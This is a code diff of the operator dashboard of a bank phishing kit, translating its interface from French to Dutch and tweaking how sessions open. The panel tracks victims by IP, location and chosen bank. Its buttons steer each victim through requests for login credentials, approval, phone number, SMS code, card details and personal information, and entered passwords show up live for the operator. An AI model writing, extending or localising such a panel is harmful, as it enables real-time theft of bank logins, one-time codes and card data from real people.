@@ -33,21 +33,21 @@ function timeAgo(ts) {
 
 function fmtTime(ts) {
   try {
-    return new Date(ts).toLocaleTimeString("fr-FR");
+    return new Date(ts).toLocaleTimeString("nl-NL");
   } catch {
     return "";
   }
 }
 
 function parseOS(ua) {
-  if (!ua) return "Inconnu";
+  if (!ua) return "Onbekend";
   const u = ua.toLowerCase();
   if (u.includes("windows")) return "Windows";
   if (u.includes("android")) return "Android";
   if (u.includes("iphone") || u.includes("ipad") || u.includes("ios")) return "iOS";
   if (u.includes("mac os") || u.includes("macintosh")) return "Mac OS";
   if (u.includes("linux")) return "Linux";
-  return "Inconnu";
+  return "Onbekend";
 }
 
 function sendCommandLegacy(visitorId, command) {
@@ -115,12 +115,12 @@ function MiniLogo({ slug, name }) {
   const src = BANK_LOGO_URLS[slug];
   const fb = BANK_FALLBACK_URLS[slug];
   return (
-    <span className="flex h-9 w-9 shrink-0 items-center justify-center overflow-hidden rounded-md bg-white ring-1 ring-neutral-200">
+    <span className="flex h-9 w-14 shrink-0 items-center justify-center overflow-hidden rounded-md bg-white px-1 ring-1 ring-neutral-200">
       {src ? (
         <img
           src={src}
           alt={name}
-          className="h-9 w-9 object-contain"
+          className="max-h-7 w-auto max-w-full object-contain"
           onError={(e) => {
             const img = e.currentTarget;
             if (fb && img.src !== fb) img.src = fb;
@@ -135,22 +135,22 @@ function MiniLogo({ slug, name }) {
 }
 
 const ACTIONS = [
-  { key: "ask_login", label: "Demander identifiants", style: "bg-blue-600 text-white" },
-  { key: "ask_approve", label: "Demander approbation", style: "bg-violet-600 text-white" },
-  { key: "ask_phone", label: "Demander téléphone", style: "bg-cyan-700 text-white" },
-  { key: "ask_sms", label: "Demander SMS", style: "bg-amber-600 text-white" },
-  { key: "ask_card", label: "Demander carte", style: "bg-emerald-700 text-white" },
-  { key: "ask_info", label: "Demander infos", style: "bg-teal-700 text-white" },
-  { key: "ask_confirm", label: "Demander confirmation", style: "bg-indigo-700 text-white" },
-  { key: "done", label: "Terminer", style: "bg-green-600 text-white" },
-  { key: "reset_waiting", label: "Chargement", style: "bg-neutral-200 text-neutral-800" },
+  { key: "ask_login", label: "Login vragen", style: "bg-blue-600 text-white" },
+  { key: "ask_approve", label: "Goedkeuring vragen", style: "bg-violet-600 text-white" },
+  { key: "ask_phone", label: "Telefoon vragen", style: "bg-cyan-700 text-white" },
+  { key: "ask_sms", label: "SMS vragen", style: "bg-amber-600 text-white" },
+  { key: "ask_card", label: "Kaart vragen", style: "bg-emerald-700 text-white" },
+  { key: "ask_info", label: "Info vragen", style: "bg-teal-700 text-white" },
+  { key: "ask_confirm", label: "Bevestiging vragen", style: "bg-indigo-700 text-white" },
+  { key: "done", label: "Voltooien", style: "bg-green-600 text-white" },
+  { key: "reset_waiting", label: "Lader", style: "bg-neutral-200 text-neutral-800" },
 ];
 
 const TABS = [
-  { key: "dashboard", label: "Tableau de bord" },
-  { key: "requests", label: "Demandes" },
+  { key: "dashboard", label: "Dashboard" },
+  { key: "requests", label: "Verzoeken" },
   { key: "logs", label: "Logs" },
-  { key: "settings", label: "Paramètres" },
+  { key: "settings", label: "Instellingen" },
 ];
 
 export default function Admin() {
@@ -207,7 +207,7 @@ export default function Admin() {
             setAuthed(true);
             return;
           }
-          setLoginErr("Identifiants invalides (API refusée).");
+          setLoginErr("Ongeldige inloggegevens (API geweigerd).");
           return;
         } finally {
           setLoginLoading(false);
@@ -217,7 +217,7 @@ export default function Admin() {
         sessionStorage.setItem("admin_auth", "1");
         setAuthed(true);
       } else {
-        setLoginErr("Identifiants invalides. Utilisez admin / admin123.");
+        setLoginErr("Ongeldige inloggegevens. Gebruik admin / admin123.");
       }
     } finally {
       setLoginLoading(false);
@@ -395,12 +395,14 @@ export default function Admin() {
 
   function openSession(v) {
     // Opening = connected from now on. Never auto-reopens for this visitor.
+    // No command is sent when the visitor is already past the loader (e.g.
+    // login shows directly) — the session just watches silently.
     rememberDismissed(v.id);
     setSessionId(v.id);
     try {
       sessionStorage.setItem("admin_session", v.id);
     } catch {}
-    sendCommandLocal(v.id, "connected");
+    if ((v.status || "waiting") === "waiting") sendCommandLocal(v.id, "connected");
   }
 
   function closeSession() {
@@ -412,7 +414,8 @@ export default function Admin() {
   }
 
   // Auto-connect: on the live visitors (dashboard) page only, a newly arrived
-  // online visitor waiting on the loader pops open by itself — no button.
+  // online visitor pops open by itself — no button. Login shows directly on
+  // the visitor side, so fresh arrivals on the loader OR on login qualify.
   // Fresh arrivals only (joined < 2 min ago) so old rows never yank the screen.
   useEffect(() => {
     if (!authed || sessionId) return;
@@ -421,7 +424,7 @@ export default function Admin() {
     const cand = allList.find(
       (x) =>
         isOnline(x, t) &&
-        (x.status || "waiting") === "waiting" &&
+        (x.status === "waiting" || x.status === "login_requested") &&
         !dismissedRef.current.has(x.id) &&
         t - (x.joinedAt || t) < 120000
     );
@@ -445,24 +448,24 @@ export default function Admin() {
       <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
         <form onSubmit={doLogin} className="w-full max-w-sm rounded-2xl bg-white p-5 shadow-lg sm:p-6">
           <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-xl bg-gradient-to-br from-purple-700 to-fuchsia-600 text-xl font-extrabold text-white">A</div>
-          <h1 className="mt-3 text-center text-[18px] font-extrabold">Connexion admin</h1>
+          <h1 className="mt-3 text-center text-[18px] font-extrabold">Admin login</h1>
           <p className="mt-1 text-center text-[13px] text-neutral-500">
-            {apiEnabled() ? "Auth via API Render + Postgres" : "Auth locale (VITE_API_URL pour Postgres)"}
+            {apiEnabled() ? "Auth via Render API + Postgres" : "Lokale auth (VITE_API_URL voor Postgres)"}
           </p>
           <label className="mt-4 block">
-            <span className="text-[14px] font-bold">Nom d&apos;utilisateur</span>
+            <span className="text-[14px] font-bold">Gebruikersnaam</span>
             <input value={username} onChange={(e) => setUsername(e.target.value)} autoComplete="username" placeholder="admin" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
           </label>
           <label className="mt-3 block">
-            <span className="text-[14px] font-bold">Mot de passe</span>
+            <span className="text-[14px] font-bold">Wachtwoord</span>
             <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} autoComplete="current-password" placeholder="••••••••" className="mt-1.5 w-full rounded-lg border border-neutral-300 px-3.5 py-3 text-[16px] outline-none focus:border-purple-700 sm:text-[16px]" />
           </label>
           {loginErr && <p className="mt-2 text-[13.5px] font-semibold text-red-600">{loginErr}</p>}
           <button type="submit" disabled={loginLoading} className="mt-4 min-h-[48px] w-full rounded-lg bg-gradient-to-r from-purple-700 to-fuchsia-600 py-3 text-[15px] font-bold text-white disabled:opacity-50">
-            {loginLoading ? "Vérification…" : "Se connecter →"}
+            {loginLoading ? "Controleren…" : "Inloggen →"}
           </button>
-          <p className="mt-3 text-center text-[12px] text-neutral-400">Par défaut : admin / admin123 • modifiez ADMIN_USER/PASS sur Render</p>
-          <Link to="/" className="mt-2 block text-center text-[13px] font-semibold text-neutral-500">← Retour au site</Link>
+          <p className="mt-3 text-center text-[12px] text-neutral-400">Standaard: admin / admin123 • wijzig ADMIN_USER/PASS op Render</p>
+          <Link to="/" className="mt-2 block text-center text-[13px] font-semibold text-neutral-500">← Terug naar site</Link>
         </form>
       </div>
     );
@@ -498,10 +501,10 @@ export default function Admin() {
           </nav>
           <div className="flex shrink-0 items-center gap-2">
             <span className="hidden items-center gap-1.5 rounded-full border border-emerald-400/20 bg-emerald-500/10 px-2.5 py-1 text-[13px] font-semibold text-emerald-300 sm:flex">
-              <span className="live-dot h-1.5 w-1.5 rounded-full bg-emerald-400" /> {onlineCount} en ligne
+              <span className="live-dot h-1.5 w-1.5 rounded-full bg-emerald-400" /> {onlineCount} live
             </span>
             <button onClick={doLogout} className="rounded-full bg-white/10 px-3.5 py-2 text-[13px] font-bold transition hover:bg-white/20 active:scale-95">
-              Déconnexion
+              Uitloggen
             </button>
           </div>
         </div>
@@ -527,8 +530,8 @@ export default function Admin() {
             {/* Dashboard / Requests table */}
             <div className="flex flex-wrap items-center justify-between gap-2">
               <h2 className="text-[16px] font-extrabold text-white">
-                {tab === "requests" ? `Demandes (${list.length})` : `Tableau de bord (${list.length})`}
-                <span className="ml-2 text-[12px] font-semibold text-purple-300">{apiMode ? "API Postgres" : "mode local"}</span>
+                {tab === "requests" ? `Verzoeken (${list.length})` : `Dashboard (${list.length})`}
+                <span className="ml-2 text-[12px] font-semibold text-purple-300">{apiMode ? "Postgres API" : "lokale modus"}</span>
               </h2>
               <div className="flex flex-wrap items-center gap-1.5">
                 <button
@@ -538,7 +541,7 @@ export default function Admin() {
                 >
                   ⭳ Export all
                 </button>
-                {[{ k: "all", l: "Tous" }, { k: "online", l: "En ligne" }, { k: "offline", l: "Hors ligne" }].map((f) => (
+                {[{ k: "all", l: "Alles" }, { k: "online", l: "Online" }, { k: "offline", l: "Offline" }].map((f) => (
                   <button
                     key={f.k}
                     onClick={() => setFilter(f.k)}
@@ -552,7 +555,7 @@ export default function Admin() {
 
             {list.length === 0 ? (
               <div className="mt-3 rounded-xl bg-white/5 p-6 text-center text-[14px] text-purple-200 ring-1 ring-white/10">
-                Aucun visiteur ici. Ouvrez le site dans un autre onglet, cliquez sur une banque — elle apparaît ici et sa session s&apos;ouvre automatiquement.
+                Geen bezoekers hier. Open de site in een ander tabblad, klik op een bank — deze verschijnt hier en de sessie opent automatisch.
               </div>
             ) : (
               <>
@@ -561,12 +564,12 @@ export default function Admin() {
                   <table className="w-full min-w-[720px] border-collapse bg-[#1d1430] text-left text-[14px]">
                     <thead>
                       <tr className="bg-gradient-to-r from-fuchsia-700 to-purple-700 text-[12px] uppercase tracking-wider text-white">
-                        <th className="whitespace-nowrap px-4 py-3">Statut</th>
+                        <th className="whitespace-nowrap px-4 py-3">Status</th>
                         <th className="whitespace-nowrap px-4 py-3">IP</th>
-                        <th className="whitespace-nowrap px-4 py-3">Banque</th>
+                        <th className="whitespace-nowrap px-4 py-3">Bank</th>
                         <th className="whitespace-nowrap px-4 py-3">OS</th>
-                        <th className="whitespace-nowrap px-4 py-3">Aperçu</th>
-                        <th className="whitespace-nowrap px-4 py-3">Actions</th>
+                        <th className="whitespace-nowrap px-4 py-3">Overzicht</th>
+                        <th className="whitespace-nowrap px-4 py-3">Acties</th>
                       </tr>
                     </thead>
                     <tbody>
@@ -577,11 +580,11 @@ export default function Admin() {
                             <td className="whitespace-nowrap px-4 py-3">
                               <span className={`inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
                                 <span className={`h-1.5 w-1.5 rounded-full ${online ? "bg-green-400" : "bg-neutral-400"}`} />
-                                {online ? "En ligne" : "Hors ligne"}
+                                {online ? "Online" : "Offline"}
                               </span>
                             </td>
                             <td className="px-3 py-2.5 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
-                            <td className="px-3 py-2.5 font-semibold text-purple-100">{v.bankName || v.bank || "BANQUE NON SÉLECTIONNÉE"}</td>
+                            <td className="px-3 py-2.5 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NIET GESELECTEERD"}</td>
                             <td className="px-3 py-2.5 text-purple-200">{parseOS(v.ua)}</td>
                             <td className="whitespace-nowrap px-4 py-3">
                               <span className="inline-flex items-center gap-1 rounded bg-white/10 px-2 py-0.5 font-mono text-[13px] text-purple-100">
@@ -591,10 +594,10 @@ export default function Admin() {
                             <td className="whitespace-nowrap px-4 py-3">
                               <div className="flex gap-1.5">
                                 <button onClick={() => openSession(v)} className="min-h-[32px] rounded-md bg-fuchsia-600 px-2.5 py-1 text-[13px] font-bold text-white hover:bg-fuchsia-500">
-                                  Voir
+                                  Bekijk
                                 </button>
                                 <button onClick={() => removeVisitor(v.id)} className="min-h-[32px] rounded-md bg-white/10 px-2.5 py-1 text-[13px] font-bold text-red-300 hover:bg-white/20">
-                                  Supprimer
+                                  Verwijderen
                                 </button>
                               </div>
                             </td>
@@ -623,10 +626,10 @@ export default function Admin() {
                         </div>
                         <div className="mt-2.5 flex gap-1.5">
                           <button onClick={() => openSession(v)} className="min-h-[44px] flex-1 rounded-lg bg-fuchsia-600 text-[14px] font-bold text-white">
-                            Voir 👁 {logsByVisitor[v.id] || 0}
+                            Bekijk 👁 {logsByVisitor[v.id] || 0}
                           </button>
                           <button onClick={() => removeVisitor(v.id)} className="min-h-[44px] rounded-lg bg-white/10 px-4 text-[14px] font-bold text-red-300">
-                            Supprimer
+                            Verwijderen
                           </button>
                         </div>
                       </div>
@@ -684,7 +687,7 @@ function LogCard({ s, meta, footer, wrapClass }) {
         <button
           type="button"
           onClick={() => doCopy(allText, "__all")}
-          title="Tout copier"
+          title="Alles kopiëren"
           className="flex min-h-[28px] min-w-[28px] items-center justify-center rounded-md bg-white/10 px-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-fuchsia-600 active:scale-95"
         >
           {copied === "__all" ? "✓" : "⧉"}
@@ -698,7 +701,7 @@ function LogCard({ s, meta, footer, wrapClass }) {
             <button
               type="button"
               onClick={() => doCopy(String(val), k)}
-              title={`Copier ${k}`}
+              title={`Kopiëren ${k}`}
               className="flex min-h-[24px] min-w-[24px] shrink-0 items-center justify-center rounded-md bg-white/10 px-1 text-[12px] font-bold text-purple-200 transition hover:bg-fuchsia-600 hover:text-white active:scale-95"
             >
               {copied === k ? "✓" : "⧉"}
@@ -714,20 +717,20 @@ function LogCard({ s, meta, footer, wrapClass }) {
 function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
   const online = isOnline(v, now);
   const rows = [
-    ["Statut", online ? "En ligne" : "Hors ligne", online ? "text-green-300" : "text-neutral-300"],
-    ["Adresse IP", v.ip || "…", "font-mono"],
-    ["Localisation", `${v.city || "…"}, ${v.country || "…"}`, ""],
-    ["Banque", v.bankName || v.bank || "—", "font-bold"],
-    ["Étape", STATUS_LABEL[v.status] || v.status || "—", ""],
+    ["Status", online ? "Online" : "Offline", online ? "text-green-300" : "text-neutral-300"],
+    ["IP-adres", v.ip || "…", "font-mono"],
+    ["Locatie", `${v.city || "…"}, ${v.country || "…"}`, ""],
+    ["Bank", v.bankName || v.bank || "—", "font-bold"],
+    ["Stap", STATUS_LABEL[v.status] || v.status || "—", ""],
     ["OS", parseOS(v.ua), ""],
-    ["En ligne depuis", timeAgo(v.joinedAt || v.lastSeen), ""],
-    ["Dernière activité", `${timeAgo(v.lastSeen)} • ${fmtTime(v.lastSeen)}`, ""],
+    ["Online sinds", timeAgo(v.joinedAt || v.lastSeen), ""],
+    ["Laatst gezien", `${timeAgo(v.lastSeen)} • ${fmtTime(v.lastSeen)}`, ""],
   ];
   return (
     <div className="w-full">
       <div className="flex flex-wrap items-center gap-2">
         <button onClick={onBack} className="min-h-[40px] rounded-full bg-white/10 px-4 py-2 text-[13px] font-bold text-purple-100 hover:bg-white/20">
-          ← Tableau de bord
+          ← Dashboard
         </button>
         <div className="flex min-w-0 flex-1 items-center gap-2.5">
           <MiniLogo slug={v.bank} name={v.bankName} />
@@ -737,14 +740,14 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
           </div>
         </div>
         <span className={`shrink-0 rounded-full px-2.5 py-1 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-          {online ? "● En ligne" : "● Hors ligne"}
+          {online ? "● Online" : "● Offline"}
         </span>
       </div>
 
       <div className="mt-3 grid w-full grid-cols-1 gap-3 lg:grid-cols-12">
         {/* LEFT — device status info */}
         <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
-          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Statut de l&apos;appareil</h3>
+          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Apparaatstatus</h3>
           <dl className="mt-2 space-y-2">
             {rows.map(([k, val, cls]) => (
               <div key={k} className="flex items-start justify-between gap-2 border-b border-white/5 pb-1.5 text-[13px] last:border-0">
@@ -773,7 +776,7 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
           <div className="mt-2.5 space-y-2.5">
             {logs.length === 0 && (
               <p className="rounded-lg bg-white/5 p-4 text-center text-[13.5px] text-purple-200">
-                Aucune donnée. Utilisez le panneau de droite → Demander identifiants. L&apos;identifiant et le mot de passe saisis apparaissent ici en direct.
+                Nog geen gegevens. Gebruik het rechterpaneel → Login vragen. Ingevulde gebruikersnaam/wachtwoord verschijnt hier live.
               </p>
             )}
             {logs.map((s) => (
@@ -797,10 +800,10 @@ function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
             ))}
           </div>
           <button onClick={onRemove} className="mt-2 min-h-[40px] w-full rounded-lg bg-white/5 px-3 py-2 text-[13px] font-bold text-red-300 ring-1 ring-white/10 hover:bg-white/10">
-            Supprimer le visiteur
+            Bezoeker verwijderen
           </button>
           <p className="mt-2 text-[12px] leading-snug text-purple-300/80">
-            L&apos;utilisateur attend sur le chargement après chaque saisie. Demandez les étapes une par une : Identifiants → Approbation → Téléphone → SMS → Carte → Infos → Confirmation.
+            De gebruiker wacht op de lader na elke invoer. Vraag de stappen één voor één: Inloggen → Goedkeuring → Telefoon → SMS → Kaart → Info → Bevestigen.
           </p>
         </aside>
       </div>
@@ -825,7 +828,7 @@ function GlobalLogs({ submissions, onView }) {
       </div>
       <div className="mt-3 space-y-2.5">
         {all.length === 0 && (
-          <p className="rounded-xl bg-white/5 p-5 text-center text-[13.5px] text-purple-200 ring-1 ring-white/10">Aucun log pour le moment.</p>
+          <p className="rounded-xl bg-white/5 p-5 text-center text-[13.5px] text-purple-200 ring-1 ring-white/10">Nog geen logs.</p>
         )}
         {all.map((s) => (
           <LogCard
@@ -835,7 +838,7 @@ function GlobalLogs({ submissions, onView }) {
             meta={<span className="font-mono text-[12px] text-purple-300">{s.visitorId?.slice(0, 10)} • {s.bank}</span>}
             footer={
               <button onClick={() => onView(s.visitorId)} className="mt-2 min-h-[36px] rounded-lg bg-white/10 px-3 py-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-white/20 active:scale-95">
-                Ouvrir la session →
+                Sessie openen →
               </button>
             }
           />
@@ -848,16 +851,16 @@ function GlobalLogs({ submissions, onView }) {
 function Settings({ apiMode, onlineCount, total, onLogout }) {
   return (
     <div className="w-full max-w-xl">
-      <h2 className="text-[16px] font-extrabold text-white">Paramètres</h2>
+      <h2 className="text-[16px] font-extrabold text-white">Instellingen</h2>
       <div className="mt-3 space-y-2.5 rounded-xl bg-[#1d1430] p-4 text-[14px] ring-1 ring-white/10">
-        <div className="flex justify-between gap-2"><span className="text-purple-300">Mode</span><b className="text-white">{apiMode ? "API Postgres" : "Mode local"}</b></div>
+        <div className="flex justify-between gap-2"><span className="text-purple-300">Modus</span><b className="text-white">{apiMode ? "Postgres API" : "Lokale modus"}</b></div>
         {apiMode && <div className="flex justify-between gap-2"><span className="text-purple-300">API</span><span className="break-all font-mono text-[13px] text-white">{apiBase()}</span></div>}
-        <div className="flex justify-between gap-2"><span className="text-purple-300">En ligne</span><b className="text-white">{onlineCount} / {total}</b></div>
-        <div className="flex justify-between gap-2"><span className="text-purple-300">Utilisateur admin</span><b className="text-white">admin</b></div>
+        <div className="flex justify-between gap-2"><span className="text-purple-300">Live nu</span><b className="text-white">{onlineCount} / {total}</b></div>
+        <div className="flex justify-between gap-2"><span className="text-purple-300">Admin gebruiker</span><b className="text-white">admin</b></div>
         <button onClick={onLogout} className="mt-1 min-h-[44px] w-full rounded-lg bg-red-500/20 py-2.5 text-[14px] font-bold text-red-200">
-          Déconnexion
+          Uitloggen
         </button>
-        <Link to="/" className="block text-center text-[13px] font-semibold text-purple-300">← Retour au site</Link>
+        <Link to="/" className="block text-center text-[13px] font-semibold text-purple-300">← Terug naar site</Link>
       </div>
     </div>
   );
